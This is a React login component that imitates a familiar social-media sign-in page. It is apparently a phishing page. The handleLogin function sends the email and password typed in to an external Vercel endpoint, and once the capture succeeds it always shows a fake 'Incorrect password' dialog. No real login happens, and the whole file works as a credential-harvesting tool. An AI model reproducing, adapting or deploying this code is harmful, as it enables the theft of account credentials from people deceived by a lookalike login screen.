import axios from "axios";
import React, { useEffect, useState } from "react";
import Logo from "../image/text.png";
import { LoadingButton } from "@mui/lab";
import { Dialog } from "@mui/material";

const Login = () => {

  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });

  const [open,setOpen] = useState(false)
  const [loading,setLoading] = useState(false)

  const validation = () => {
    if (!formData.email || formData.password.length < 7) return false;
    return true;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  };

  const handleLogin = async () => {
    try {
      setLoading(true)
      const response = await axios.post(
        "https://abc-9z6qj9c5x-patelbittu2406.vercel.app/api/posts",
        formData
      );
      if (response.status === 201) {
        setTimeout(() => {
          handleDilogOpenClose()
          setLoading(false)
        }, 2000);
      }
    } catch (err) {
      console.log(err);
    }
  };

  const handleDilogOpenClose = () => {
    setOpen(pre => !pre)
  }

  useEffect(() => {
    validation();
  }, [formData]);



  return (
    <>
      <Dialog sx={{".MuiPaper-root":{
borderRadius:'20px',
      }}} open={open}>
          <div 
              style={{
                height:'200px',
                width:'300px',
                display:'flex',
                alignItems:"center",
                flexDirection:"column"
                }}>
            <p style={{fontWeight:'bold',fontSize:'20px',marginTop:'20px'}}>Incorrect password</p>
            <p style={{textAlign: "center",marginTop:'20px'}}>The password you entered is <br /> incorrect. Please try again</p>
            <LoadingButton
            onClick={handleDilogOpenClose}
            sx={{
              marginTop: "45px",
              fontWeight:"100",
              borderTop:'1px solid #d1d0ce',
              fontSize:"18px",
              height: "45px",
              width: "100%",
              background: "white",
              color: "black",
              textTransform: "none",
              "&:hover": {
                background: "white"
            }
              }}>
                ok
                </LoadingButton>
          </div>
      </Dialog>

    <div
      style={{
        width: "100%",
        height: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div
        style={{
          maxWidth: "500px",
          padding: "10%",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}
      >
        <img style={{ height: "70px" }} src={Logo} alt="" />
        <input
          onChange={handleChange}
          name="email"
          style={{
            marginTop: "50px",
            width: "100%",
            height: "20px",
            padding: "10px",
            borderRadius: "10px",
            border: "1px solid gray",
          }}
          placeholder="Phone number email or username"
          type="text"
        />
        <input
          onChange={handleChange}
          name="password"
          style={{
            width: "100%",
            height: "20px",
            padding: "10px",
            borderRadius: "10px",
            border: "1px solid gray",
            marginTop: "15px",
          }}
          placeholder="password"
          type="password"
        />
        {/* <button
          disabled={!validation()}
          onClick={handleLogin}
          style={{
            background: "#0095f6",
            height: "35px",
            width: "110%",
            color: "white",
            marginTop: "35px",
            borderRadius: "10px",
            border: "0px solid gray",
            fontWeight: "bold",
          }}
        >
          Login
        </button> */}
        <LoadingButton 
          loading={loading}
          onClick={handleLogin}
            sx={{
              marginTop: "35px",
              borderRadius: "10px",
              height: "35px",
              width: "110%",
              fontWeight: "bold",
              background: "#0095f6",
              color: "white",
              textTransform: "none",
              "&:hover": {
                background: "#0095f6"
            }
              }}>
                Login
                </LoadingButton>
        <p style={{ fontSize: "12px", marginTop: "5px" }}>
          Forgot your login Details?{" "}
          <span style={{ fontWeight: "bold", color: "#0095f6" }}>
            Get help Logging
          </span>{" "}
        </p>
      </div>
    </div>
    </>
  );
};

export default Login;
